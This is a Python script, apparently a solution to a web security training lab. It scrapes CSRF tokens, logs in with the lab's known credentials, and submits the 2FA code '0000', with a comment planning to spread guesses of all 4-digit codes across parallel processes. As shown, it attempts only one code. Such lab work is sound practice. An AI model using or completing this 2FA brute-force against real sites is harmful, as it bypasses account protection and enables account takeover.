import sys

import requests
from bs4 import BeautifulSoup

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

# First:
# GET login page to find value of cross-site request forgery token.
s = requests.Session()
login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Login to user we have credentials for.
logindata = {
    'csrf': csrf,
    'username': 'carlos',
    'password': 'montoya'
}
print(f'Logging in as carlos:montoya')
resp = s.post(login_url, data=logindata)
print(f'Login response: {resp.text}')

# Get next csrf token for interaction with 2fa (login2) endpoint.
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

# Send auth request to 2fa endpoint with csrf token and '0000'
# Here's where we can split multiple processes that will all call a function
# that makes this post with a different 4-digit code each time.
login2_url = f'https://{site}/login2'
login2data = {
    'csrf' : csrf,
    'mfa-code' : str(0).zfill(4)
}
resp = s.post(login2_url, data=login2data, allow_redirects=False)
if resp.status_code == 302:
    print(f'2fa valid with response code {resp.status_code}')
    # Visit account profile page to complete level
else:
    print(f'2fa invalid with response code: {resp.status_code}')
